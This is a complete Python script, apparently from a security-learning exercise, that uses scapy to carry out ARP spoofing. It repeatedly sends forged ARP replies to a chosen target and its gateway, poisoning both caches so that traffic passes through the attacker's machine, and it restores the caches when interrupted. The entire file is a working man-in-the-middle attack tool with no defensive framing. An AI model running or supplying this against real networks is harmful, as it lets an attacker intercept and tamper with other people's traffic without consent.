#/usr/bin/python3

import scapy.all as scapy
import time
import optparse

def add_options():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target_ip", dest = "target_ip", help = "Target's IP Address in DDN format")
    parser.add_option("-g", "--gateway", dest = "gateway_ip", help = "Gateway's IP Address in DDN format")
    return parser.parse_args()[0]

def get_mac(ip_address_range):
    arp_packet = scapy.ARP(pdst = ip_address_range)
    broadcast_frame = scapy.Ether(dst = 'ff:ff:ff:ff:ff:ff')
    results = scapy.srp(broadcast_frame/arp_packet, iface = "eth0", timeout = 2, verbose = False)
    return results[0][0][1].hwsrc

def spoof_it(target_ip, spoofed_ip):
    target_mac = get_mac(target_ip)
    spoof_message = scapy.ARP(op=2, pdst = target_ip, psrc = spoofed_ip, hwdst = target_mac)
    scapy.send(spoof_message, verbose = False)

def restore(dest_ip, src_ip):
    target_mac = get_mac(dest_ip)
    src_mac = get_mac(src_ip)
    spoof_message = scapy.ARP(op=2, pdst=dest_ip, psrc=src_ip, hwdst=target_mac, hwsrc=src_mac)
    scapy.send(spoof_message, count = 4, verbose = False)


counter = 0
target_ip = add_options().target_ip
gateway_ip = add_options().gateway_ip

try:
    while True:
        counter += 2
        spoof_it(target_ip, gateway_ip)
        spoof_it(gateway_ip, target_ip)
        print(f"\r[+] Amount of packets sent: {counter}", end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] CTRL-C pressed: restoring original state. Please Wait!")
    restore(gateway_ip, target_ip)
    restore(target_ip, gateway_ip)
except IndexError:
    print("[-] Provide all of the arguments. Use --help for usage.")
